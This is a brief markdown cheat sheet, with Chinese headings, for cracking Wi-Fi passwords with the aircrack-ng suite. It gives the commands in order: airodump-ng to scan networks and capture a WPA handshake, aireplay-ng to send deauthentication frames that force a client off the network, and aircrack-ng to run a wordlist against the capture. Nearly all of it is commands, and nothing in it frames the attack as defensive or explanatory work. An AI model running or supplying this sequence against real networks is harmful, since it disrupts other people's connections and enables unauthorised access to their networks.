# air-crack

- 扫描信号

  ```sh
  airodump-ng -a --essid-regex "[^CAAS|CASTP|castp|caas|castp2|BRI_CAAS|DIRECT]" wlan0mon
  ```

  抓包

- ```sh
  airodump-ng -c 11 --bssid mac -w /root/shake wlan0mon
  ```

  ACK

  ```sh
  aireplay-ng -0 10 -a net-mac -c c-mac wlan0mon
  ```

  Crack

  ```sh
  aircrack-ng -w pass.txt -b mac ./shake-01.cap
  ```
